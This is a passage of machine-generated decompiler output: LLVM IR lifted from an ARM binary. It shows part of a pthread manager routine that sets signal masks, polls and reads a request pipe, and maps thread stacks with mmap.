dec_label_pc_b14c:                                ; preds = %dec_label_pc_b14c.loopexit, %dec_label_pc_b120, %dec_label_pc_b134
  %v2_b150 = load i32, i32* @global_var_2bd14.195, align 4
  store i32 %v2_b150, i32* %r3.global-to-local, align 4
  %v2_b154 = icmp eq i32 %v2_b150, 0
  store i1 %v2_b154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b154, label %dec_label_pc_b170, label %dec_label_pc_b15c

dec_label_pc_b15c:                                ; preds = %dec_label_pc_b14c
  %v2_b160 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_b160, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint ([3 x i8]* @global_var_b090.219 to i32))
  br label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b14c, %dec_label_pc_b15c
  %v2_b170 = load i32, i32* %stack_var_-16, align 4
  %v1_b174 = urem i32 %v2_b170, 128
  %v1_b178 = mul nuw nsw i32 %v1_b174, 16777216
  %v3_b17c = add nuw i32 %v1_b178, 16777216
  %v3_b180 = sdiv i32 %v3_b17c, 33554432
  store i32 %v3_b180, i32* %r3.global-to-local, align 4
  %v3_b17c.off = add nuw i32 %v1_b178, 50331647
  %tmp = icmp ult i32 %v3_b17c.off, 67108863
  store i1 %tmp, i1* %cpsr_z.global-to-local, align 1
  %tmp12 = icmp slt i32 %v3_b17c, 33554432
  br i1 %tmp12, label %dec_label_pc_b19c, label %dec_label_pc_b18c

dec_label_pc_b18c:                                ; preds = %dec_label_pc_b170
  %v2_b190 = call i32 @pthread_kill_all_threads(i32 %v1_b174, i32 1)
  %v1_b198 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_b19c:                                ; preds = %dec_label_pc_b170, %entry
  store i32 -2147483647, i32* %r2.global-to-local, align 4
  %v3_b1a8 = call i32 @__libc_waitpid(i32 -1, i32 %v2_b098, i32 -2147483647)
  %v2_b1ac = icmp eq i32 %v3_b1a8, 0
  store i1 %v2_b1ac, i1* %cpsr_z.global-to-local, align 1
  %v5_b1b0 = icmp sgt i32 %v3_b1a8, 0
  br i1 %v5_b1b0, label %dec_label_pc_b0a0, label %dec_label_pc_b1b4

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b19c
  store i32 %v3_b094, i32* @r4, align 4
  store i32 %v6_b094, i32* @r5, align 4
  ret i32 %v3_b1a8

; uselistorder directives
  uselistorder i32 %v3_b1a8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v0_b0c0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_b114, { 1, 0 }
  uselistorder i32 %v2_b0b8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 0, 1, 2, 8, 3, 4, 5, 6, 9 }
  uselistorder label %dec_label_pc_b170, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b120, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-264 = alloca i32, align 4
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b2f0.221 to i32), i32* %r2.global-to-local, align 4
  %v2_b1d8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_b1d8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b2e8.222 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b2f0.221 to i32), i32* @global_var_2b2ec.223, align 4
  store i32 ptrtoint (i32* @global_var_2b2e8.222 to i32), i32* bitcast (i32** @global_var_2b2e4.224 to i32*), align 4
  store i32 %v2_b1d8, i32* @r0, align 4
  %v5_b1f0 = call i32 @sigfillset(i32 %v2_b1d8, i32 ptrtoint (i32* @global_var_2b2e8.222 to i32), i32 ptrtoint (i32* @global_var_2b2f0.221 to i32), i32 ptrtoint (i32* @global_var_2b2a0.186 to i32), i32 %arg1)
  store i32 ptrtoint (i32* @global_var_2b48c.226 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_b1d8, i32* @r0, align 4
  %v2_b1fc = load i32, i32* @global_var_2b48c.226, align 4
  store i32 %v2_b1fc, i32* %r1.global-to-local, align 4
  %v1_b200 = call i32 @__GI_sigdelset(i32 %v2_b1d8)
  store i32 %v2_b1d8, i32* @r0, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_b20c = call i32 @__GI_sigdelset(i32 %v2_b1d8)
  store i32 %v1_b20c, i32* %r0.global-to-local, align 4
  %v2_b214 = load i32, i32* @global_var_30248.202, align 4
  store i32 %v2_b214, i32* %r3.global-to-local, align 4
  %v2_b218 = icmp eq i32 %v2_b214, 0
  store i1 %v2_b218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b218, label %dec_label_pc_b234, label %dec_label_pc_b220

dec_label_pc_b220:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2b490.204 to i32), i32* %r3.global-to-local, align 4
  %v2_b224 = load i32, i32* @global_var_2b490.204, align 4
  store i32 %v2_b224, i32* %r1.global-to-local, align 4
  %v2_b228 = icmp eq i32 %v2_b224, 0
  store i1 %v2_b228, i1* %cpsr_z.global-to-local, align 1
  %tmp60 = icmp slt i32 %v2_b224, 1
  br i1 %tmp60, label %bb61, label %bb

bb:                                               ; preds = %dec_label_pc_b220
  store i32 %v2_b1d8, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_b220, %bb
  %v5_b230 = icmp sgt i32 %v2_b224, 0
  call void @__pseudo_cond_branch(i1 %v5_b230, i32 ptrtoint (i32* @global_var_131cc.229 to i32))
  br label %dec_label_pc_b234

dec_label_pc_b234:                                ; preds = %entry, %bb61
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_b1d8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b240 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_b240 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_b240, i32 0)
  %v2_b248 = load i32, i32* bitcast (i32** @global_var_2b480.199 to i32*), align 4
  store i32 %v2_b248, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_d688.232 to i32), i32* %r0.global-to-local, align 4
  %v1_b250 = call i32 @__pthread_manager_adjust_prio(i32 ptrtoint (i32* @global_var_d688.232 to i32))
  store i32 %v1_b250, i32* %r0.global-to-local, align 4
  %v2_b258 = ptrtoint i32* %stack_var_-284 to i32
  br label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b26c, %dec_label_pc_b234
  store i32 %arg1, i32* @r0, align 4
  store i32 %v2_b258, i32* @r1, align 4
  store i32 148, i32* @r2, align 4
  %v1_b260 = call i32 @__libc_read(i32 %arg1)
  store i32 %v1_b260, i32* %r0.global-to-local, align 4
  %v3_b264 = icmp eq i32 %v1_b260, -1
  %v8_b264 = icmp eq i32 %v1_b260, -1
  store i1 %v8_b264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b264, label %dec_label_pc_b26c, label %dec_label_pc_b27c

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b254
  %v0_b26c = call i32 @__errno_location()
  store i32 %v0_b26c, i32* %r0.global-to-local, align 4
  %v1_b270 = inttoptr i32 %v0_b26c to i32*
  %v2_b270 = load i32, i32* %v1_b270, align 4
  store i32 %v2_b270, i32* %r3.global-to-local, align 4
  %v7_b274 = icmp eq i32 %v2_b270, 4
  store i1 %v7_b274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b274, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b254, %dec_label_pc_b26c
  store i32 %arg1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_b29c = ptrtoint i32* %stack_var_-8 to i32
  %v3_b2a0 = bitcast i32* %stack_var_-8 to %pollfd*
  %v4_b2e4 = zext i8 %tmp50 to i32
  %tmp = urem i8 %tmp50, 2
  %v2_b2e8 = icmp eq i8 %tmp, 0
  %v7_b304 = icmp eq i32 %tmp49, 5
  %v2_b5f4 = ptrtoint i32* %stack_var_-264 to i32
  %v3_b798 = urem i32 %tmp48, 1024
  %v4_b79c = mul nuw nsw i32 %v3_b798, 16
  %v5_b79c = add i32 %v4_b79c, ptrtoint (i32* @global_var_270a0.207 to i32)
  br label %dec_label_pc_b294

dec_label_pc_b294:                                ; preds = %.thread, %dec_label_pc_b2f0, %dec_label_pc_b8b4, %dec_label_pc_b8a4, %dec_label_pc_b2e4, %dec_label_pc_b8c4, %dec_label_pc_b898, %dec_label_pc_b7ec, %dec_label_pc_b7d8, %dec_label_pc_b890, %dec_label_pc_b27c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 2000, i32* %r2.global-to-local, align 4
  store i32 %v2_b29c, i32* %r0.global-to-local, align 4
  %v4_b2a0 = call i32 @__libc_poll(%pollfd* %v3_b2a0, i32 1, i32 2000)
  store i32 %v4_b2a0, i32* %r0.global-to-local, align 4
  store i32 %v4_b2a0, i32* @r4, align 4
  %v0_b2a8 = call i32 @getppid()
  store i32 %v0_b2a8, i32* %r0.global-to-local, align 4
  %v7_b2ac = icmp eq i32 %v0_b2a8, 1
  store i1 %v7_b2ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2ac, label %dec_label_pc_b2b4, label %dec_label_pc_b2c4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b294
  store i32 9, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  br label %dec_label_pc_b864

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b294
  store i32 ptrtoint (i32* @global_var_2bd10.193 to i32), i32* %r2.global-to-local, align 4
  %v2_b2c8 = load i32, i32* @global_var_2bd10.193, align 4
  store i32 %v2_b2c8, i32* %r3.global-to-local, align 4
  %v2_b2cc = icmp eq i32 %v2_b2c8, 0
  store i1 %v2_b2cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2cc, label %.thread, label %bb62

bb62:                                             ; preds = %dec_label_pc_b2c4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_2bd10.193, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b2c4, %bb62
  %v1_b2d8 = xor i1 %v2_b2cc, true
  call void @__pseudo_cond_branch(i1 %v1_b2d8, i32 ptrtoint (i32* @global_var_b094.234 to i32))
  %v0_b2dc = load i32, i32* @r4, align 4
  %v7_b2dc = icmp eq i32 %v0_b2dc, 1
  store i1 %v7_b2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2dc, label %dec_label_pc_b2e4, label %dec_label_pc_b294

dec_label_pc_b2e4:                                ; preds = %.thread
  store i32 %v4_b2e4, i32* %r3.global-to-local, align 4
  store i1 %v2_b2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2e8, label %dec_label_pc_b294, label %dec_label_pc_b2f0

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  store i32 %arg1, i32* @r0, align 4
  store i32 %v2_b258, i32* @r1, align 4
  store i32 148, i32* @r2, align 4
  %v1_b2fc = call i32 @__libc_read(i32 %arg1)
  store i32 %v1_b2fc, i32* %r0.global-to-local, align 4
  store i32 %tmp49, i32* %r3.global-to-local, align 4
  store i1 %v7_b304, i1* %cpsr_z.global-to-local, align 1
  switch i32 %tmp49, label %dec_label_pc_b294 [
    i32 0, label %dec_label_pc_b328
    i32 1, label %dec_label_pc_b78c
    i32 2, label %dec_label_pc_b7f8
    i32 3, label %dec_label_pc_b86c
    i32 4, label %dec_label_pc_b898
    i32 5, label %dec_label_pc_b8a4
  ]

dec_label_pc_b328:                                ; preds = %dec_label_pc_b2f0
  %v3_b328 = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  store i32 %tmp48, i32* @sl, align 4
  %v0_b334 = call i32 @__GI_getpagesize()
  store i32 %v0_b334, i32* @r0, align 4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  store i32 %tmp55, i32* %r3.global-to-local, align 4
  store i32 %tmp46, i32* %ip.global-to-local, align 4
  %v1_b348 = add i32 %v3_b328, 20
  %v2_b348 = inttoptr i32 %v1_b348 to i32*
  %v3_b348 = load i32, i32* %v2_b348, align 4
  store i32 %v3_b348, i32* %r1.global-to-local, align 4
  %v1_b34c = add i32 %v3_b328, 412
  %v2_b34c = inttoptr i32 %v1_b34c to i32*
  %v3_b34c = load i32, i32* %v2_b34c, align 4
  store i32 %v3_b34c, i32* %r2.global-to-local, align 4
  %v0_b350 = load i32, i32* @sl, align 4
  %v2_b350 = icmp eq i32 %v0_b350, 0
  store i1 %v2_b350, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_b334, i32* @r8, align 4
  br i1 %v2_b350, label %dec_label_pc_b39c.lr.ph, label %dec_label_pc_b36c

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b328
  %v1_b36c = add i32 %v0_b350, 4
  %v2_b36c = inttoptr i32 %v1_b36c to i32*
  %v3_b36c = load i32, i32* %v2_b36c, align 4
  store i32 %v3_b36c, i32* %r3.global-to-local, align 4
  %v2_b370 = icmp eq i32 %v3_b36c, 0
  store i1 %v2_b370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b370, label %dec_label_pc_b39c.lr.ph, label %dec_label_pc_b378

dec_label_pc_b378:                                ; preds = %dec_label_pc_b36c
  %v0_b378 = call i32 @geteuid()
  store i32 %v0_b378, i32* %r0.global-to-local, align 4
  %v2_b37c = icmp eq i32 %v0_b378, 0
  store i1 %v2_b37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b37c, label %dec_label_pc_b39c.lr.ph, label %bb63

bb63:                                             ; preds = %dec_label_pc_b378
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b39c.lr.ph:                          ; preds = %dec_label_pc_b328, %dec_label_pc_b36c, %dec_label_pc_b378
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b39c

dec_label_pc_b39c:                                ; preds = %dec_label_pc_b39c.lr.ph, %dec_label_pc_b4c8
  %v1_b3a0 = phi i32 [ 2, %dec_label_pc_b39c.lr.ph ], [ %v1_b4cc, %dec_label_pc_b4c8 ]
  %v4_b3a0 = mul nuw nsw i32 %v1_b3a0, 16
  %v5_b3a0 = add i32 %v4_b3a0, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %v5_b3a0, i32* %r3.global-to-local, align 4
  %v1_b3a4 = add i32 %v4_b3a0, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8)
  %v2_b3a4 = inttoptr i32 %v1_b3a4 to i32*
  %v3_b3a4 = load i32, i32* %v2_b3a4, align 4
  store i32 %v3_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3a8 = icmp eq i32 %v3_b3a4, 0
  store i1 %v2_b3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3a8, label %dec_label_pc_b3b0, label %dec_label_pc_b4c8

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b39c
  store i32 ptrtoint (i32* @global_var_2be4c.179 to i32), i32* %r3.global-to-local, align 4
  %v0_b3b4 = load i32, i32* @sl, align 4
  %v2_b3b4 = icmp eq i32 %v0_b3b4, 0
  store i1 %v2_b3b4, i1* %cpsr_z.global-to-local, align 1
  %v2_b3b8 = load i32, i32* @global_var_2be4c.179, align 4
  br i1 %v2_b3b4, label %dec_label_pc_b3f8, label %dec_label_pc_b3c0

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b0
  %v1_b3c0 = add i32 %v0_b3b4, 24
  %v2_b3c0 = inttoptr i32 %v1_b3c0 to i32*
  %v3_b3c0 = load i32, i32* %v2_b3c0, align 4
  store i32 %v3_b3c0, i32* %r3.global-to-local, align 4
  %v2_b3c4 = icmp eq i32 %v3_b3c0, 0
  store i1 %v2_b3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3c4, label %dec_label_pc_b3f8, label %dec_label_pc_b3cc

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b3c0
  %v1_b3cc = add i32 %v0_b3b4, 28
  %v2_b3cc = inttoptr i32 %v1_b3cc to i32*
  %v3_b3cc = load i32, i32* %v2_b3cc, align 4
  store i32 %v3_b3cc, i32* %r2.global-to-local, align 4
  %v1_b3d0 = add i32 %v0_b3b4, 32
  %v2_b3d0 = inttoptr i32 %v1_b3d0 to i32*
  %v3_b3d0 = load i32, i32* %v2_b3d0, align 4
  store i32 %v3_b3d0, i32* %r1.global-to-local, align 4
  %v1_b3d437 = add i32 %v3_b3cc, -480
  %v1_b3d8 = and i32 %v1_b3d437, -4
  store i32 %v1_b3d8, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_30238.188 to i32), i32* %r3.global-to-local, align 4
  %v2_b3e0 = sub i32 %v3_b3cc, %v3_b3d0
  store i32 %v2_b3e0, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_30238.188, align 4
  br label %dec_label_pc_b4d8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b3c0, %dec_label_pc_b3b0
  store i1 %v2_b3b4, i1* %cpsr_z.global-to-local, align 1
  %v0_b3fc = load i32, i32* @r8, align 4
  %v1_b3fc = sub i32 2097152, %v0_b3fc
  store i32 %v1_b3fc, i32* @r5, align 4
  br i1 %v2_b3b4, label %dec_label_pc_b428, label %dec_label_pc_b404

dec_label_pc_b404:                                ; preds = %dec_label_pc_b3f8
  %v1_b404 = add i32 %v0_b3b4, 32
  %v2_b404 = inttoptr i32 %v1_b404 to i32*
  %v3_b404 = load i32, i32* %v2_b404, align 4
  %v2_b408 = add i32 %v0_b3fc, -1
  %v1_b40c = add i32 %v2_b408, %v3_b404
  store i32 %v0_b3fc, i32* %r1.global-to-local, align 4
  %v2_b414 = udiv i32 %v1_b40c, %v0_b3fc
  store i32 %v2_b414, i32* %r0.global-to-local, align 4
  %v2_b418 = mul i32 %v2_b414, %v0_b3fc
  store i32 %v2_b418, i32* %r3.global-to-local, align 4
  %v3_b41c = icmp ult i32 %v1_b3fc, %v2_b418
  %v9_b41c = icmp eq i32 %v1_b3fc, %v2_b418
  store i1 %v9_b41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b41c, label %dec_label_pc_b428, label %dec_label_pc_b42c

dec_label_pc_b428:                                ; preds = %dec_label_pc_b404, %dec_label_pc_b3f8
  br label %dec_label_pc_b42c

dec_label_pc_b42c:                                ; preds = %dec_label_pc_b404, %dec_label_pc_b428
  %storemerge38 = phi i32 [ %v1_b3fc, %dec_label_pc_b428 ], [ %v2_b418, %dec_label_pc_b404 ]
  store i32 %storemerge38, i32* @r4, align 4
  %v3_b434 = mul nsw i32 %v1_b3a0, -2097152
  %v2_b440 = load i32, i32* @global_var_300c8.241, align 4
  %v4_b434 = or i32 %v3_b434, 2096672
  %v2_b444 = add i32 %v4_b434, %v2_b3b8
  store i32 %v2_b444, i32* @r6, align 4
  %v3_b448 = mul i32 %v2_b440, 4
  store i32 %v3_b448, i32* %r1.global-to-local, align 4
  %v2_b44c = sub i32 %v2_b444, %v3_b448
  store i32 -1, i32* %ip.global-to-local, align 4
  %v1_b454 = add i32 %v2_b44c, 480
  store i32 %v1_b454, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 306, i32* %r3.global-to-local, align 4
  %v6_b46c = call i32 @mmap(i32 %v1_b454, i32 %v3_b448, i32 7, i32 306, i32 -1, i32 0)
  store i32 %v6_b46c, i32* %r0.global-to-local, align 4
  %v7_b470 = icmp eq i32 %v6_b46c, -1
  store i1 %v7_b470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b470, label %dec_label_pc_b4c8, label %dec_label_pc_b478

dec_label_pc_b478:                                ; preds = %dec_label_pc_b42c
  %v0_b478 = load i32, i32* @r4, align 4
  %v1_b478 = load i32, i32* @r6, align 4
  %v2_b478 = sub i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r3.global-to-local, align 4
  %v1_b47c = load i32, i32* @r5, align 4
  %v9_b47c = icmp eq i32 %v0_b478, %v1_b47c
  store i1 %v9_b47c, i1* %cpsr_z.global-to-local, align 1
  %v1_b480 = add i32 %v2_b478, 480
  store i32 %v1_b480, i32* %fp.global-to-local, align 4
  br i1 %v9_b47c, label %dec_label_pc_b4bc, label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b478
  %v0_b488 = load i32, i32* @sl, align 4
  %v1_b488 = add i32 %v0_b488, 20
  %v2_b488 = inttoptr i32 %v1_b488 to i32*
  %v3_b488 = load i32, i32* %v2_b488, align 4
  store i32 %v3_b488, i32* %sb.global-to-local, align 4
  %v2_b48c = sub i32 %v1_b480, %v3_b488
  store i32 %v2_b48c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 %v3_b488, i32* %r1.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r7, align 4
  store i32 %v0_b4a0, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v6_b4b0 = call i32 @mmap(i32 %v2_b48c, i32 %v3_b488, i32 %v0_b4a0, i32 16, i32 -1, i32 %v0_b4a0)
  store i32 %v6_b4b0, i32* %r0.global-to-local, align 4
  %v3_b4b4 = icmp eq i32 %v6_b4b0, -1
  %v8_b4b4 = icmp eq i32 %v6_b4b0, -1
  store i1 %v8_b4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b4b4, label %dec_label_pc_b4bc, label %dec_label_pc_b4d8

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b488, %dec_label_pc_b478
  %v0_b4bc = load i32, i32* @r7, align 4
  store i32 %v0_b4bc, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_b4d8

dec_label_pc_b4c8:                                ; preds = %dec_label_pc_b39c, %dec_label_pc_b42c
  %v1_b4cc = add nuw nsw i32 %v1_b3a0, 1
  store i32 %v1_b4cc, i32* %r1.global-to-local, align 4
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v2_b394 = icmp ugt i32 %v1_b4cc, 1023
  %v7_b394 = icmp eq i32 %v1_b4cc, 1024
  store i1 %v7_b394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b394, label %dec_label_pc_b760, label %dec_label_pc_b39c

dec_label_pc_b4d8:                                ; preds = %dec_label_pc_b488, %dec_label_pc_b4bc, %dec_label_pc_b3cc
  %stack_var_-312.0 = phi i32 [ %v0_b4bc, %dec_label_pc_b4bc ], [ %v2_b48c, %dec_label_pc_b488 ], [ 0, %dec_label_pc_b3cc ]
  %v0_b4d8 = load i32, i32* @r6, align 4
  store i32 %v0_b4d8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 480, i32* @r2, align 4
  %v0_b4e4 = call i32 @__GI_memset()
  store i32 ptrtoint (i32* @global_var_2bd18.245 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2b0a0.209 to i32), i32* @r4, align 4
  %v2_b4f0 = load i32, i32* @global_var_2bd18.245, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v2_b4f8 = load i32, i32* @global_var_2b0a0.209, align 4
  %v1_b4fc = add i32 %v2_b4f0, 1024
  %v2_b500 = add i32 %v1_b4fc, %v1_b3a0
  %v0_b504 = load i32, i32* @r6, align 4
  store i32 %v0_b504, i32* @r8, align 4
  %v1_b50c = add i32 %v2_b4f8, 1
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v1_b50c, i32* @global_var_2b0a0.209, align 4
  store i32 %v1_b4fc, i32* @global_var_2bd18.245, align 4
  store i32 %stack_var_-312.0, i32* %r2.global-to-local, align 4
  %v3_b520 = add i32 %v0_b504, 64
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 0, i8* %v4_b520, align 1
  %v0_b524 = load i32, i32* %r1.global-to-local, align 4
  %v1_b524 = trunc i32 %v0_b524 to i8
  %v2_b524 = load i32, i32* @r8, align 4
  %v3_b524 = add i32 %v2_b524, 65
  %v4_b524 = inttoptr i32 %v3_b524 to i8*
  store i8 %v1_b524, i8* %v4_b524, align 1
  %v0_b528 = load i32, i32* %ip.global-to-local, align 4
  %v3_b528 = mul i32 %v0_b528, 16
  store i32 %v3_b528, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32* @r7, align 4
  %v0_b530 = load i32, i32* @r8, align 4
  %v1_b530 = add i32 %v0_b530, 72
  store i32 %v2_b500, i32* %r3.global-to-local, align 4
  %v2_b538 = add i32 %v0_b530, 68
  %v3_b538 = inttoptr i32 %v2_b538 to i32*
  store i32 %v1_b530, i32* %v3_b538, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v0_b540 = load i32, i32* @r6, align 4
  %v1_b540 = load i32, i32* @r7, align 4
  %v2_b540 = add i32 %v1_b540, %v0_b540
  store i32 %v2_b540, i32* %r0.global-to-local, align 4
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = load i32, i32* @r8, align 4
  %v2_b544 = add i32 %v1_b544, 16
  %v3_b544 = inttoptr i32 %v2_b544 to i32*
  store i32 %v0_b544, i32* %v3_b544, align 4
  %v0_b548 = load i32, i32* @r8, align 4
  %v1_b548 = add i32 %v0_b548, 80
  store i32 %v1_b548, i32* @lr, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* @sl, align 4
  %v2_b550 = icmp eq i32 %v0_b550, 0
  store i1 %v2_b550, i1* %cpsr_z.global-to-local, align 1
  %v0_b554 = load i32, i32* %sb.global-to-local, align 4
  %v2_b554 = add i32 %v0_b548, 400
  %v3_b554 = inttoptr i32 %v2_b554 to i32*
  store i32 %v0_b554, i32* %v3_b554, align 4
  %v0_b558 = load i32, i32* @r8, align 4
  %v2_b558 = add i32 %v0_b558, 404
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v0_b558, i32* %v3_b558, align 4
  %v0_b55c = load i32, i32* %ip.global-to-local, align 4
  %v1_b55c = load i32, i32* @r8, align 4
  %v2_b55c = add i32 %v1_b55c, 408
  %v3_b55c = inttoptr i32 %v2_b55c to i32*
  store i32 %v0_b55c, i32* %v3_b55c, align 4
  %v0_b560 = load i32, i32* @lr, align 4
  %v1_b560 = load i32, i32* @r8, align 4
  %v2_b560 = add i32 %v1_b560, 76
  %v3_b560 = inttoptr i32 %v2_b560 to i32*
  store i32 %v0_b560, i32* %v3_b560, align 4
  %v0_b564 = load i32, i32* %r1.global-to-local, align 4
  %v1_b564 = load i32, i32* %r0.global-to-local, align 4
  %v2_b564 = add i32 %v1_b564, 4
  %v3_b564 = inttoptr i32 %v2_b564 to i32*
  store i32 %v0_b564, i32* %v3_b564, align 4
  %v0_b568 = load i32, i32* %r2.global-to-local, align 4
  %v1_b568 = load i32, i32* @r8, align 4
  %v2_b568 = add i32 %v1_b568, 396
  %v3_b568 = inttoptr i32 %v2_b568 to i32*
  store i32 %v0_b568, i32* %v3_b568, align 4
  %v0_b56c = load i32, i32* %fp.global-to-local, align 4
  %v1_b56c = load i32, i32* %r0.global-to-local, align 4
  %v2_b56c = add i32 %v1_b56c, 12
  %v3_b56c = inttoptr i32 %v2_b56c to i32*
  store i32 %v0_b56c, i32* %v3_b56c, align 4
  %v0_b570 = load i32, i32* %r1.global-to-local, align 4
  %v1_b570 = load i32, i32* @r6, align 4
  %v2_b570 = load i32, i32* @r7, align 4
  %v3_b570 = add i32 %v2_b570, %v1_b570
  %v4_b570 = inttoptr i32 %v3_b570 to i32*
  store i32 %v0_b570, i32* %v4_b570, align 4
  %v0_b574 = load i32, i32* %r3.global-to-local, align 4
  %v1_b574 = load i32, i32* @r8, align 4
  %v2_b574 = add i32 %v1_b574, 228
  %v3_b574 = inttoptr i32 %v2_b574 to i32*
  store i32 %v0_b574, i32* %v3_b574, align 4
  %v0_b578 = load i32, i32* %r0.global-to-local, align 4
